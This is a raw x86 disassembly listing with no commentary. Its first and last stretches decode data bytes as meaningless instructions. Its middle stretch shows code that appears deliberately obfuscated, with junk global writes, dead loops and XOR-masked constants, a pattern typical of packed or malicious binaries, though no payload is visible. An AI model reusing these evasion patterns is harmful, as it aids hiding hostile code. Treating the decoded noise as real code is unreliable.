  40f02e:	test   eax,0x7b54362e
  40f033:	add    esp,DWORD PTR [edx-0x45]
  40f036:	stos   DWORD PTR es:[edi],eax
  40f037:	sbb    esp,ecx
  40f039:	jnp    0x40f0ae
  40f03b:	dec    edx
  40f03c:	imul   eax,DWORD PTR ds:0xfe7e5112,0xffffffa6
  40f043:	mov    bh,0x26
  40f045:	add    al,BYTE PTR [ebx+0x33]
  40f048:	jle    0x40f000
  40f04a:	fimul  WORD PTR [edi]
  40f04c:	cld    
  40f04d:	push   edi
  40f04e:	das    
  40f04f:	mov    edx,DWORD PTR es:[ebx]
  40f052:	sbb    BYTE PTR [ebx-0x51],0x6b
  40f056:	shl    DWORD PTR [ebp-0x29],1
  40f059:	(bad)  
  40f05a:	mov    ds:0xbdb60f7d,eax
  40f05f:	and    ch,BYTE PTR [eax+0x1f8e9ee5]
  40f065:	lock mov bl,BYTE PTR [ebp-0x18]
  40f069:	sbb    BYTE PTR [esi-0x48],ah
  40f06c:	retf   
  40f06d:	call   DWORD PTR [ecx+0x35]
  40f070:	sar    bl,1
  40f072:	jne    0x40f02d
  40f074:	mov    ebp,0x3a8a94bd
  40f079:	imul   ebp,DWORD PTR [ebx-0x30],0xffffffba
  40f07d:	and    ch,BYTE PTR [esi-0xae62df2]
  40f083:	cli    
  40f084:	sbb    BYTE PTR [edx+esi*1+0x5f],bh
  40f088:	add    eax,0x2dfe5d21
  40f08d:	sub    DWORD PTR [ebp-0x45],esi
  40f090:	dec    esi
  40f091:	mov    bh,0xd8
  40f093:	ins    BYTE PTR es:[edi],dx
  40f094:	jp     0x40f04d
  40f096:	mov    eax,ds:0x8da74591
  40f09b:	out    dx,al
  40f09c:	mov    esp,0x2946c549
  40f0a1:	in     al,0x4a
  40f0a3:	and    eax,0x5f8b8249
  40f0a8:	jbe    0x40f0c0
  40f0aa:	jnp    0x40f074
  40f0ac:	jecxz  0x40f0c6
  40f0ae:	ret    0xb572
  40f0b1:	(bad)  
  40f0b2:	shr    DWORD PTR [edx-0x1],0x5b
  40f0b6:	sub    al,0x9d
  40f0b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0b9:	es xor esp,edx
  40f0bc:	mov    cl,0x2
  40f0be:	mov    ch,BYTE PTR [edi]
  40f0c0:	cmc    
  40f0c1:	cs xchg edx,eax
  40f0c3:	xor    eax,0x9c65d793
  40f0c8:	pop    es
  40f0c9:	fwait
  40f0ca:	test   eax,0x5ad8421b
  40f0cf:	mov    gs,edx
  40f0d1:	mov    al,ds:0x5c99d12e
  40f0d6:	les    ebx,FWORD PTR [eax]
  40f0d8:	imul   edx,ebx,0x379bde0a
  40f0de:	lea    esi,[ebp+ecx*8+0x40d2fb]
  40f0e5:	es cmc 
  40f0e7:	clc    
  40f0e8:	pusha  
  40f0e9:	es mov eax,0x140177a2
  40f0ef:	lea    ecx,[ebp+0x48566378]
  40f0f5:	pop    esi
  40f0f6:	rcl    DWORD PTR [ebx-0x151b2a21],cl
  40f0fc:	cmp    eax,0xf2db2a1c
  40f101:	lods   al,BYTE PTR ds:[esi]
  40f102:	pop    esp
  40f103:	pop    es
  40f104:	std    
  40f105:	aas    
  40f106:	imul   ebx,DWORD PTR ds:0xbea38d4b,0x34347690
  40f110:	adc    dh,BYTE PTR [edx-0x75f2ce86]
  40f116:	pop    ebp
  40f117:	mov    ch,0x6a
  40f119:	push   edx
  40f11a:	cmp    bh,dl
  40f11c:	xchg   ebp,eax
  40f11d:	test   eax,0xc9096b70
  40f122:	cld    
  40f123:	mov    edi,0x853f8a78
  40f128:	jecxz  0x40f128
  40f12a:	or     ebx,DWORD PTR [edi-0x5613f446]
  40f130:	arpl   di,bx
  40f132:	push   ss
  40f133:	or     ch,ah
  40f135:	(bad)  
  40f137:	cmp    ch,al
  40f139:	pop    eax
  40f13a:	ds dec esi
  40f13c:	add    al,0x8b
  40f13e:	jne    0x40f14c
  40f140:	cmp    esi,eax
  40f142:	mov    eax,DWORD PTR [ebp-0x4]
  40f145:	je     0x40cd96
  40f14b:	xor    eax,edx
  40f14d:	add    eax,ecx
  40f14f:	mov    ecx,DWORD PTR [ebp+0xc]
  40f152:	imul   eax,ecx
  40f155:	add    eax,DWORD PTR [ebp+0x8]
  40f158:	mov    DWORD PTR [ebp+0xc],eax
  40f15b:	mov    eax,DWORD PTR [ebp+0xc]
  40f15e:	pop    esi
  40f15f:	leave  
  40f160:	ret    0x8
  40f163:	push   ebp
  40f164:	mov    ebp,esp
  40f166:	push   ecx
  40f167:	or     eax,0x63ef
  40f16c:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  40f173:	adc    DWORD PTR ds:0x429004,0x1463
  40f17d:	mov    eax,DWORD PTR [ebp-0x4]
  40f180:	mov    edx,DWORD PTR [ebp+0x10]
  40f183:	mov    ecx,DWORD PTR ds:0x42b010
  40f189:	add    DWORD PTR ds:0x42a000,ecx
  40f18f:	mov    ecx,0x7510896
  40f194:	neg    DWORD PTR ds:0x42b010
  40f19a:	xor    eax,ecx
  40f19c:	add    eax,0x3272dd
  40f1a1:	and    DWORD PTR ds:0x429010,0xb4c
  40f1ab:	mov    DWORD PTR [edx],eax
  40f1ad:	and    DWORD PTR ds:0x42c01c,0x0
  40f1b7:	jmp    0x40f1c9
  40f1bc:	mov    edx,DWORD PTR ds:0x42c01c
  40f1c2:	inc    edx
  40f1c3:	mov    DWORD PTR ds:0x42c01c,edx
  40f1c9:	cmp    DWORD PTR ds:0x42c01c,0x1b
  40f1d0:	jae    0x40f1f8
  40f1d6:	cmp    DWORD PTR ds:0x42c01c,0x28
  40f1dd:	jne    0x40f1f3
  40f1e3:	push   0x22f2
  40f1e8:	push   0x42e134
  40f1ed:	call   DWORD PTR ds:0x42ed5d
  40f1f3:	jmp    0x40f1bc
  40f1f8:	mov    eax,DWORD PTR [ebp+0xc]
  40f1fb:	or     DWORD PTR ds:0x42a004,ecx
  40f201:	xor    eax,ecx
  40f203:	push   esi
  40f204:	mov    esi,DWORD PTR [ebp+0x10]
  40f207:	mov    edx,0x3272dd
  40f20c:	add    eax,edx
  40f20e:	mov    DWORD PTR [esi+0x4],eax
  40f211:	mov    eax,DWORD PTR [ebp+0x14]
  40f214:	mov    esi,DWORD PTR [ebp+0x10]
  40f217:	mov    DWORD PTR [esi+0x8],eax
  40f21a:	mov    eax,DWORD PTR [ebp+0x18]
  40f21d:	mov    esi,DWORD PTR [ebp+0x10]
  40f220:	mov    DWORD PTR [esi+0xc],eax
  40f223:	mov    eax,DWORD PTR [ebp+0x1c]
  40f226:	mov    esi,DWORD PTR [ebp+0x10]
  40f229:	mov    DWORD PTR [esi+0x10],eax
  40f22c:	mov    eax,DWORD PTR [ebp+0x8]
  40f22f:	xor    eax,ecx
  40f231:	add    eax,edx
  40f233:	pop    esi
  40f234:	leave  
  40f235:	ret    0x18
  40f238:	push   ebp
  40f239:	mov    ebp,esp
  40f23b:	sub    esp,0xa4
  40f241:	adc    eax,0x77b8
  40f246:	mov    ecx,DWORD PTR [ebp+0x8]
  40f249:	adc    DWORD PTR ds:0x429000,edi
  40f24f:	mov    eax,0x8a89
  40f254:	adc    DWORD PTR ds:0x42900c,0x429028
  40f25e:	xor    ax,WORD PTR [ecx+0x20]
  40f262:	mov    ecx,DWORD PTR ds:0x429028
  40f268:	and    DWORD PTR ds:0x42b00c,ecx
  40f26e:	mov    ecx,0x3b4c
  40f273:	dec    DWORD PTR ds:0x42d014
  40f279:	add    ax,cx
  40f27c:	movzx  eax,ax
  40f27f:	add    ecx,0x1468
  40f285:	mov    DWORD PTR [ebp-0x18],eax
  40f288:	mov    BYTE PTR [ebp-0x1],0x7d
  40f28c:	mov    ecx,DWORD PTR ds:0x412000
  40f292:	mov    ecx,DWORD PTR [ecx]
  40f294:	adc    DWORD PTR ds:0x42d01c,ecx
  40f29a:	lea    eax,[ebp-0x1]
  40f29d:	sub    DWORD PTR ds:0x42c014,0xae5
  40f2a7:	mov    DWORD PTR [ebp-0x10],eax
  40f2aa:	mov    al,BYTE PTR [ebp-0x1]
  40f2ad:	inc    ecx
  40f2ae:	mov    ecx,DWORD PTR [ebp-0x10]
  40f2b1:	xor    al,0x71
  40f2b3:	adc    DWORD PTR ds:0x42b018,0x264
  40f2bd:	sub    al,0xb
  40f2bf:	adc    DWORD PTR ds:0x429014,0x5cc7
  40f2c9:	mov    BYTE PTR [ecx],al
  40f2cb:	mov    DWORD PTR ds:0x42b004,0x11
  40f2d5:	cmp    DWORD PTR ds:0x42b004,0x0
  40f2dc:	je     0x40f31e
  40f2e2:	cmp    DWORD PTR ds:0x42b004,0x1d
  40f2e9:	jne    0x40f304
  40f2ef:	push   0x42e000
  40f2f4:	push   DWORD PTR [ebp-0x18]
  40f2f7:	push   0x0
  40f2f9:	push   0x4fbc
  40f2fe:	call   DWORD PTR ds:0x42ed61
  40f304:	mov    eax,ds:0x42b004
  40f309:	dec    eax
  40f30a:	mov    ds:0x42b004,eax
  40f30f:	jmp    0x40f2d5
  40f314:	sbb    DWORD PTR ds:0x42d010,0x7483
  40f31e:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  40f325:	push   ebx
  40f326:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  40f32d:	mov    ecx,DWORD PTR [ebp-0x14]
  40f330:	push   esi
  40f331:	and    DWORD PTR ds:0x42a01c,0x0
  40f33b:	jmp    0x40f34d
  40f340:	mov    esi,DWORD PTR ds:0x42a01c
  40f346:	inc    esi
  40f347:	mov    DWORD PTR ds:0x42a01c,esi
  40f34d:	cmp    DWORD PTR ds:0x42a01c,0x1f
  40f354:	jae    0x40f3f6
  40f35a:	cmp    DWORD PTR ds:0x42a01c,0x21
  40f361:	jne    0x40f377
  40f367:	push   0x42c010
  40f36c:	push   0x562e
  40f371:	call   DWORD PTR ds:0x42ed65
  40f377:	jmp    0x40f340
  40f37c:	and    DWORD PTR ds:0x42d01c,0x0
  40f386:	xor    eax,eax
  40f388:	or     eax,DWORD PTR ds:0x42d01c
  40f38e:	inc    eax
  40f38f:	mov    ds:0x42d01c,eax
  40f394:	cmp    DWORD PTR ds:0x42d01c,0xb
  40f39b:	jne    0x40f3c1
  40f3a1:	push   DWORD PTR [ebp-0x24]
  40f3a4:	push   0x42a010
  40f3a9:	push   0x78c6
  40f3ae:	push   0x42e134
  40f3b3:	push   DWORD PTR [ebp-0x1c]
  40f3b6:	push   0x1e85
  40f3bb:	call   DWORD PTR ds:0x42ed6d
  40f3c1:	cmp    DWORD PTR ds:0x42d01c,0xa
  40f3c8:	jne    0x40f3d9
  40f3ce:	mov    eax,ds:0x42d01c
  40f3d3:	inc    eax
  40f3d4:	mov    ds:0x42d01c,eax
  40f3d9:	cmp    DWORD PTR ds:0x42d01c,0x18
  40f3e0:	jb     0x40f386
  40f3e6:	xor    eax,eax
  40f3e8:	xor    eax,DWORD PTR ds:0x411ff4
  40f3ee:	mov    eax,DWORD PTR [eax]
  40f3f0:	or     DWORD PTR ds:0x42b018,eax
  40f3f6:	mov    eax,0x7510896
  40f3fb:	sbb    DWORD PTR ds:0x42a01c,edx
  40f401:	xor    ecx,eax
  40f403:	or     esi,DWORD PTR ds:0x42a008
  40f409:	mov    esi,0x3272dd
  40f40e:	push   edi
  40f40f:	add    ecx,esi
  40f411:	jmp    0x40f435
  40f416:	mov    DWORD PTR ds:0x42a01c,0x2feb
  40f420:	mov    dl,BYTE PTR [ebp-0x1]
  40f423:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  40f42a:	mov    DWORD PTR ds:0x42b01c,0x5ed5
  40f434:	inc    ecx
  40f435:	cmp    ecx,0x40
  40f438:	jb     0x40f416
  40f43e:	mov    DWORD PTR ds:0x429018,0x19
  40f448:	cmp    DWORD PTR ds:0x429018,0x0
  40f44f:	je     0x40f47c
  40f455:	cmp    DWORD PTR ds:0x429018,0x1d
  40f45c:	jne    0x40f468
  40f462:	call   DWORD PTR ds:0x42ed71
  40f468:	mov    edx,DWORD PTR ds:0x429018
  40f46e:	dec    edx
  40f46f:	mov    DWORD PTR ds:0x429018,edx
  40f475:	jmp    0x40f448
  40f47a:	not    edx
  40f47c:	mov    edx,DWORD PTR [ebp-0x14]
  40f47f:	sub    DWORD PTR ds:0x42c00c,0x42b014
  40f489:	xor    edx,eax
  40f48b:	adc    DWORD PTR ds:0x429024,0x42a018
  40f495:	add    edx,esi
  40f497:	mov    DWORD PTR ds:0x42b014,0x72c9
  40f4a1:	jmp    0x40f5bb
  40f4a6:	dec    DWORD PTR ds:0x429014
  40f4ac:	mov    edi,DWORD PTR [ebp+0x8]
  40f4af:	adc    ecx,DWORD PTR ds:0x42a018
  40f4b5:	mov    ecx,0x8a89
  40f4ba:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40f4bf:	and    DWORD PTR ds:0x429008,0x0
  40f4c9:	jmp    0x40f4dd
  40f4ce:	xor    edi,edi
  40f4d0:	xor    edi,DWORD PTR ds:0x429008
  40f4d6:	inc    edi
  40f4d7:	mov    DWORD PTR ds:0x429008,edi
  40f4dd:	cmp    DWORD PTR ds:0x429008,0x10
  40f4e4:	jae    0x40f511
  40f4ea:	cmp    DWORD PTR ds:0x429008,0x19
  40f4f1:	jne    0x40f502
  40f4f7:	push   0x429018
  40f4fc:	call   DWORD PTR ds:0x42ed75
  40f502:	jmp    0x40f4ce
  40f507:	adc    DWORD PTR ds:0x42a010,0x20e4
  40f511:	mov    edi,0x3b4c
  40f516:	sub    DWORD PTR ds:0x42a014,0x7a80
  40f520:	add    cx,di
  40f523:	movzx  ecx,cx
  40f526:	neg    DWORD PTR ds:0x42b000
  40f52c:	mov    DWORD PTR [ebp-0x10],ecx
  40f52f:	and    DWORD PTR ds:0x42a000,0x0
  40f539:	jmp    0x40f54b
  40f53e:	mov    ecx,DWORD PTR ds:0x42a000
  40f544:	inc    ecx
  40f545:	mov    DWORD PTR ds:0x42a000,ecx
  40f54b:	cmp    DWORD PTR ds:0x42a000,0x1f
  40f552:	jae    0x40f57e
  40f558:	cmp    DWORD PTR ds:0x42a000,0x26
  40f55f:	jne    0x40f573
  40f565:	push   0x3463
  40f56a:	push   DWORD PTR [ebp-0x1c]
  40f56d:	call   DWORD PTR ds:0x42ed35
  40f573:	jmp    0x40f53e
  40f578:	or     ecx,0x6b07
  40f57e:	mov    ecx,DWORD PTR [ebp+0x8]
  40f581:	movzx  ecx,WORD PTR [ecx+edx*4]
  40f585:	mov    DWORD PTR ds:0x42a010,0x2266
  40f58f:	xor    ecx,0x8a89
  40f595:	add    ecx,edi
  40f597:	mov    DWORD PTR ds:0x42b018,0x196a
  40f5a1:	mov    edi,DWORD PTR [ebp-0x10]
  40f5a4:	mov    DWORD PTR ds:0x42a018,0x15ce
  40f5ae:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  40f5b5:	mov    ecx,0x651b
  40f5ba:	inc    edx
  40f5bb:	mov    ecx,DWORD PTR [ebp-0x18]
  40f5be:	mov    DWORD PTR ds:0x429020,0x7b55
  40f5c8:	cmp    edx,ecx
  40f5ca:	jne    0x40f4a6
  40f5d0:	mov    ecx,DWORD PTR [ebp-0x14]
  40f5d3:	mov    edx,DWORD PTR [ebp+0x10]
  40f5d6:	adc    DWORD PTR ds:0x429008,0x429014
  40f5e0:	xor    ecx,eax
  40f5e2:	mov    DWORD PTR ds:0x429028,0x35c1
  40f5ec:	add    ecx,esi
  40f5ee:	sub    DWORD PTR ds:0x429024,0xd80
  40f5f8:	mov    DWORD PTR [edx],ecx
  40f5fa:	add    ecx,0x553e
  40f600:	mov    ecx,DWORD PTR [ebp-0x14]
  40f603:	add    DWORD PTR ds:0x42901c,0xd2d
  40f60d:	xor    ecx,eax
  40f60f:	add    ecx,esi
  40f611:	mov    DWORD PTR ds:0x42d008,0x74bc
  40f61b:	mov    DWORD PTR [ebp-0x20],ecx
  40f61e:	mov    DWORD PTR ds:0x42a004,edi
  40f624:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  40f62b:	mov    DWORD PTR ds:0x429018,0x1d37
  40f635:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  40f63c:	mov    DWORD PTR ds:0x42901c,0x14b9
  40f646:	mov    DWORD PTR [ebp-0x1c],0xf89c95b5
  40f64d:	mov    DWORD PTR ds:0x42c000,edx
  40f653:	mov    ecx,DWORD PTR [ebp-0xc]
  40f656:	mov    DWORD PTR ds:0x42a018,0x1347
  40f660:	mov    DWORD PTR [ebp+0x8],ecx
  40f663:	mov    DWORD PTR ds:0x429014,0x4ea
  40f66d:	jmp    0x40f78d
  40f672:	sbb    DWORD PTR ds:0x42a018,0x42c008
  40f67c:	mov    ecx,DWORD PTR [ebp+0x8]
  40f67f:	and    edx,DWORD PTR ds:0x42c00c
  40f685:	mov    edx,DWORD PTR [ebp-0x8]
  40f688:	xor    DWORD PTR ds:0x42a008,0x42a018
  40f692:	xor    ecx,eax
  40f694:	xor    edx,eax
  40f696:	sub    ecx,edx
  40f698:	sub    edx,0x6561
  40f69e:	sub    ecx,esi
  40f6a0:	xor    ecx,eax
  40f6a2:	mov    DWORD PTR [ebp+0x8],ecx
  40f6a5:	mov    ecx,DWORD PTR [ebp+0x8]
  40f6a8:	mov    edx,DWORD PTR [ebp-0x64]
  40f6ab:	sub    DWORD PTR ds:0x42901c,0x6b48
  40f6b5:	lea    ecx,[edx+ecx*1+0x5708f2]
  40f6bc:	movzx  edx,WORD PTR ds:0x42900c
  40f6c3:	adc    DWORD PTR ds:0x42c00c,edx
  40f6c9:	mov    DWORD PTR [ebp-0x64],ecx
  40f6cc:	sbb    DWORD PTR ds:0x42a018,0x1891
  40f6d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40f6d9:	dec    edx
  40f6da:	mov    edx,DWORD PTR [ebp-0x60]
  40f6dd:	lea    ecx,[edx+ecx*1+0x5708f2]
  40f6e4:	mov    DWORD PTR [ebp-0x60],ecx
  40f6e7:	sbb    DWORD PTR ds:0x42900c,0x79ab
  40f6f1:	mov    ecx,DWORD PTR [ebp+0x8]
  40f6f4:	add    DWORD PTR ds:0x42a01c,edi
  40f6fa:	mov    edx,DWORD PTR [ebp-0x5c]
  40f6fd:	lea    ecx,[edx+ecx*1+0x5708f3]
  40f704:	mov    DWORD PTR [ebp-0x5c],ecx
  40f707:	inc    DWORD PTR ds:0x429004
  40f70d:	mov    ecx,DWORD PTR [ebp+0x8]
  40f710:	sbb    DWORD PTR ds:0x42d018,edx
  40f716:	mov    edx,DWORD PTR [ebp-0x58]
  40f719:	and    DWORD PTR ds:0x42c008,0x42b004
  40f723:	lea    ecx,[edx+ecx*1+0x5708f0]
  40f72a:	dec    edx
  40f72b:	mov    DWORD PTR [ebp-0x58],ecx
  40f72e:	movzx  ecx,WORD PTR ds:0x429000
  40f735:	adc    DWORD PTR ds:0x42c008,ecx
  40f73b:	mov    ecx,DWORD PTR [ebp+0x8]
  40f73e:	mov    edx,DWORD PTR [ebp-0x54]
  40f741:	add    DWORD PTR ds:0x42d004,0x42a014
  40f74b:	lea    ecx,[edx+ecx*1+0x5708f1]
  40f752:	mov    DWORD PTR [ebp-0x54],ecx
  40f755:	xor    DWORD PTR ds:0x42d01c,0x80b
  40f75f:	mov    ecx,DWORD PTR [ebp+0x8]
  40f762:	and    DWORD PTR ds:0x42d008,0x7467
  40f76c:	mov    edx,DWORD PTR [ebp-0x50]
  40f76f:	or     DWORD PTR ds:0x42c004,0x42a000
  40f779:	lea    ecx,[edx+ecx*1+0x5708fe]
  40f780:	add    DWORD PTR ds:0x42c010,0x5221
  40f78a:	mov    DWORD PTR [ebp-0x50],ecx
  40f78d:	or     ecx,DWORD PTR ds:0x429028
  40f793:	mov    ecx,DWORD PTR [ebp+0x8]
  40f796:	xor    ecx,eax
  40f798:	add    ecx,esi
  40f79a:	mov    DWORD PTR ds:0x42c004,0x633d
  40f7a4:	jne    0x40f672
  40f7aa:	jmp    0x411e4d
  40f7af:	neg    DWORD PTR ds:0x42901c
  40f7b5:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7b8:	mov    edx,DWORD PTR [ebp-0x8]
  40f7bb:	sub    DWORD PTR ds:0x429008,0x429014
  40f7c5:	xor    ecx,eax
  40f7c7:	xor    edx,eax
  40f7c9:	sbb    DWORD PTR ds:0x42c018,0x25ac
  40f7d3:	sub    ecx,edx
  40f7d5:	or     DWORD PTR ds:0x42d000,0x429014
  40f7df:	sub    ecx,esi
  40f7e1:	xor    ecx,eax
  40f7e3:	mov    DWORD PTR ds:0x42b018,0x1de
  40f7ed:	mov    DWORD PTR [ebp-0x1c],ecx
  40f7f0:	mov    DWORD PTR ds:0x42c000,0x7d6a
  40f7fa:	mov    ecx,DWORD PTR [ebp-0xc]
  40f7fd:	mov    DWORD PTR ds:0x429028,0x9e0
  40f807:	mov    DWORD PTR [ebp+0x8],ecx
  40f80a:	jmp    0x40f91d
  40f80f:	mov    ecx,DWORD PTR [ebp+0x8]
  40f812:	mov    edx,DWORD PTR [ebp-0x8]
  40f815:	xor    ecx,eax
  40f817:	adc    DWORD PTR ds:0x42c008,ecx
  40f81d:	xor    edx,eax
  40f81f:	xor    DWORD PTR ds:0x42900c,0x3273
  40f829:	sub    ecx,edx
  40f82b:	sub    ecx,esi
  40f82d:	or     edi,edi
  40f82f:	xor    ecx,eax
  40f831:	mov    DWORD PTR [ebp+0x8],ecx
  40f834:	and    DWORD PTR ds:0x429020,0x0
  40f83e:	jmp    0x40f850
  40f843:	mov    edi,DWORD PTR ds:0x429020
  40f849:	inc    edi
  40f84a:	mov    DWORD PTR ds:0x429020,edi
  40f850:	cmp    DWORD PTR ds:0x429020,0x1b
  40f857:	jae    0x40f8a8
  40f85d:	cmp    DWORD PTR ds:0x429020,0x6
  40f864:	jne    0x40f87f
  40f86a:	push   0x6ce2
  40f86f:	push   0x42d018
  40f874:	push   0x18a6
  40f879:	call   DWORD PTR ds:0x42ed39
  40f87f:	cmp    DWORD PTR ds:0x429020,0x5
  40f886:	jne    0x40f899
  40f88c:	mov    edi,DWORD PTR ds:0x429020
  40f892:	inc    edi
  40f893:	mov    DWORD PTR ds:0x429020,edi
  40f899:	jmp    0x40f843
  40f89e:	and    DWORD PTR ds:0x42b004,0x42b01c
  40f8a8:	mov    ecx,DWORD PTR [ebp+0x8]
  40f8ab:	mov    edx,DWORD PTR [ebp+0x8]
  40f8ae:	and    DWORD PTR ds:0x42d010,0x0
  40f8b8:	mov    edi,DWORD PTR ds:0x42d010
  40f8be:	inc    edi
  40f8bf:	mov    DWORD PTR ds:0x42d010,edi
  40f8c5:	cmp    DWORD PTR ds:0x42d010,0x5
  40f8cc:	jne    0x40f8e2
  40f8d2:	push   0x42e11d
  40f8d7:	push   0x42e110
  40f8dc:	call   DWORD PTR ds:0x42ed3d
  40f8e2:	cmp    DWORD PTR ds:0x42d010,0x4
  40f8e9:	jne    0x40f8fc
  40f8ef:	mov    edi,DWORD PTR ds:0x42d010
  40f8f5:	inc    edi
  40f8f6:	mov    DWORD PTR ds:0x42d010,edi
  40f8fc:	cmp    DWORD PTR ds:0x42d010,0x15
  40f903:	jb     0x40f8b8
  40f909:	imul   edx,edx,0x5708f2
  40f90f:	xor    ecx,eax
  40f911:	add    ecx,esi
  40f913:	lea    ecx,[ebp+ecx*4-0x64]
  40f917:	mov    edi,DWORD PTR [ecx]
  40f919:	add    edx,edi
  40f91b:	mov    DWORD PTR [ecx],edx
  40f91d:	mov    ecx,DWORD PTR [ebp+0x8]
  40f920:	xor    ecx,eax
  40f922:	add    ecx,esi
  40f924:	jne    0x40f80f
  40f92a:	mov    ecx,DWORD PTR [ebp-0x20]
  40f92d:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  40f934:	mov    dl,BYTE PTR [ebp-0x1]
  40f937:	cmp    cl,dl
  40f939:	je     0x411dae
  40f93f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f942:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  40f949:	mov    edx,DWORD PTR [ebp+0xc]
  40f94c:	cmp    cl,BYTE PTR [edx]
  40f94e:	jne    0x411e5f
  40f954:	mov    ecx,DWORD PTR [ebp-0x14]
  40f957:	mov    edx,DWORD PTR [ebp+0xc]
  40f95a:	movsx  edx,BYTE PTR [edx]
  40f95d:	xor    ecx,eax
  40f95f:	add    ecx,esi
  40f961:	cmp    edx,ecx
  40f963:	mov    ecx,DWORD PTR [ebp-0xc]
  40f966:	mov    DWORD PTR [ebp+0x8],ecx
  40f969:	mov    ecx,DWORD PTR [ebp+0x8]
  40f96c:	je     0x411ed9
  40f972:	jmp    0x40f9a7
  40f977:	mov    ecx,DWORD PTR [ebp+0x8]
  40f97a:	mov    edx,DWORD PTR [ebp-0x8]
  40f97d:	xor    ecx,eax
  40f97f:	xor    edx,eax
  40f981:	sub    ecx,edx
  40f983:	sub    ecx,esi
  40f985:	xor    ecx,eax
  40f987:	mov    DWORD PTR [ebp+0x8],ecx
  40f98a:	mov    ecx,DWORD PTR [ebp+0x8]
  40f98d:	mov    edx,DWORD PTR [ebp+0x8]
  40f990:	xor    ecx,eax
  40f992:	imul   edx,edx,0x5708f2
  40f998:	add    ecx,esi
  40f99a:	lea    ecx,[ebp+ecx*4-0x64]
  40f99e:	mov    edi,DWORD PTR [ecx]
  40f9a0:	add    edx,edi
  40f9a2:	mov    DWORD PTR [ecx],edx
  40f9a4:	mov    ecx,DWORD PTR [ebp+0x8]
  40f9a7:	xor    ecx,eax
  40f9a9:	add    ecx,esi
  40f9ab:	jne    0x40f977
  40f9b1:	mov    ecx,DWORD PTR [ebp-0x14]
  40f9b4:	mov    edx,DWORD PTR [ebp+0x8]
  40f9b7:	xor    ecx,eax
  40f9b9:	xor    edx,eax
  40f9bb:	add    ecx,esi
  40f9bd:	add    edx,esi
  40f9bf:	cmp    ecx,edx
  40f9c1:	jae    0x411df3
  40f9c7:	lea    edx,[ecx-0x3272dd]
  40f9cd:	mov    DWORD PTR [ebp-0x18],edx
  40f9d0:	mov    edi,DWORD PTR [ebp-0x18]
  40f9d3:	mov    DWORD PTR [ebp-0x24],0x705fd0f
  40f9da:	lea    edx,[ebp-0x24]
  40f9dd:	mov    DWORD PTR [ebp-0x10],edx
  40f9e0:	mov    edx,DWORD PTR [ebp-0x10]
  40f9e3:	add    DWORD PTR [edx],0x705fa0f
  40f9e9:	mov    ebx,DWORD PTR [ebp-0x10]
  40f9ec:	xor    edi,eax
  40f9ee:	add    edi,DWORD PTR [ebx]
  40f9f0:	lea    edx,[ebp+ecx*4-0x64]
  40f9f4:	mov    ebx,DWORD PTR [edx]
  40f9f6:	xor    edi,ebx
  40f9f8:	mov    DWORD PTR [edx],edi
  40f9fa:	mov    edx,DWORD PTR [ebp+0x8]
  40f9fd:	xor    edx,eax
  40f9ff:	inc    ecx
  40fa00:	inc    DWORD PTR [ebp-0x18]
  40fa03:	add    edx,esi
  40fa05:	jmp    0x411da1
  40fa0a:	fstp   DWORD PTR [ebx]
  40fa0c:	sti    
  40fa0d:	sar    DWORD PTR [ebx-0x4f],1
  40fa10:	jnp    0x40fa2d
  40fa12:	inc    esi
  40fa13:	xchg   ebx,eax
  40fa14:	or     ch,BYTE PTR [eax]
  40fa16:	mov    eax,ds:0x743e4b87
  40fa1b:	retf   0x7a7a
  40fa1e:	sti    
  40fa1f:	pop    edi
  40fa20:	jp     0x40fa9c
  40fa22:	aam    0x34
  40fa24:	cmp    BYTE PTR [edx],bh
  40fa26:	xor    ch,BYTE PTR [eax+edx*1]
  40fa29:	mov    DWORD PTR [ebx-0x7099e880],eax
  40fa2f:	leave  
  40fa30:	jmp    0xd1545c0e
  40fa35:	aam    0x50
  40fa37:	in     eax,0x46
  40fa39:	repz into 
  40fa3b:	std    
  40fa3c:	jp     0x40f9fd
  40fa3e:	mov    esi,0xd8d7a706
  40fa43:	adc    al,0xd3
  40fa45:	js     0x40fa48
  40fa47:	gs mov edi,0x1054777a
  40fa4d:	pop    eax
  40fa4e:	push   esp
  40fa4f:	jecxz  0x40fa94
  40fa51:	lods   al,BYTE PTR ds:[esi]
  40fa52:	mov    ch,0x68
  40fa54:	cdq    
  40fa55:	dec    eax
  40fa56:	psubd  mm0,QWORD PTR [ecx+0x62e9e8ff]
  40fa5d:	xor    ebx,DWORD PTR [ebp+0x135ec4c9]
  40fa63:	pusha  
  40fa64:	aam    0x97
  40fa66:	add    DWORD PTR [ecx-0x6d3872e6],esi
  40fa6c:	xchg   ebp,eax
  40fa6d:	inc    esp
  40fa6e:	ds jge 0x40fae8
  40fa71:	cmp    BYTE PTR [ecx],ah
  40fa73:	lods   al,BYTE PTR ds:[esi]
  40fa74:	call   0xc097:0xddd707f7
  40fa7b:	fdiv   DWORD PTR [ebx+0x5e66df64]
  40fa81:	add    dl,al
  40fa83:	fild   DWORD PTR [esi+0x31]
  40fa86:	(bad)  
  40fa87:	xchg   edx,eax
  40fa88:	loopne 0x40face
  40fa8a:	jg     0x40fafa
  40fa8c:	cmc    
  40fa8d:	mov    ds:0x2a24d251,eax
  40fa92:	xor    bh,BYTE PTR [edi]
  40fa94:	pop    edi
  40fa95:	dec    edi
  40fa96:	cmp    al,0x8a
  40fa98:	lahf   
  40fa99:	ficom  WORD PTR [ebx]
  40fa9b:	xchg   edx,eax
  40fa9c:	out    dx,eax
  40fa9d:	xchg   esp,eax
  40fa9e:	jmp    0xd41a:0x8d7f1da0
  40faa5:	out    dx,al
  40faa6:	push   ebx
  40faa7:	xchg   esi,eax
  40faa8:	test   BYTE PTR [esi],ah
  40faaa:	in     eax,0x8
  40faac:	xchg   edx,eax
  40faad:	loope  0x40fa66
  40faaf:	lds    ecx,FWORD PTR [eax-0x4f]
  40fab2:	add    BYTE PTR [ecx+0x6c],dl
